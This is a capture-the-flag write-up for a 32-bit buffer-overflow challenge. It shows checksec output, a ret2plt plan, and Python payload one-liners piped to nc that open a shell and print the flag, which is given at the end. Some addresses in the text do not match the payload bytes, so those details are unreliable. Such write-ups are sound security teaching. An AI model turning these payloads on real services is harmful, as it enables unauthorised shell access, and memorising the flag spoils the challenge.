# Shella Hard [Pwnable 475 points]

### Chall's description
```
Difficulty: mind-melting hard
This program is crap! Is there even anything here?

nc x.x.x.x 12345
```

#### File give for the chall
* [shella-hard](./shella-hard)

## Solution
```
$ file shella-hard
shella-hard: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2
```

The executable doesn't print nothing, instead we insert 0x1e byte, by using the read function, (it reads the null byte and terminate with \x0a)

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

no pie, no canary, we should give a try to ret2libc or ROP, in this case we have direclty the system@got and even the "/bin/sh" string, in our segment code space.. so the author of this challenge is clearly inviting us to use ret2plt (ROP). 

So now these are the steps:
	1) find the address "/bin/sh". Got it 0x0804850
	2) find the address of system@plt. for some reason we use 0x8048457

run:
```bash
cat <( python -c 'print "A"*0x10 + "B"*0x4 + "\x67\x84\x04\x08" +"\x00\x85\x04\x08" + "\x00\x85\x04\x08" +"\x00"*4' ) - | nc X.X.X.X 12345 #works only on local machine...


( python -c 'print "A"*0x10 + "B"*0x4 + "\x67\x84\x04\x08" +"\x00\x85\x04\x08" + "\x00\x85\x04\x08" +"\x00"*4'; cat ) | nc X.X.X.X 12345 #this works everywhere
```

now we have a shell open, then just execute "cat flag".

# The Flag:
	TUCTF{175_wh475_1n51d3_7h47_c0un75}
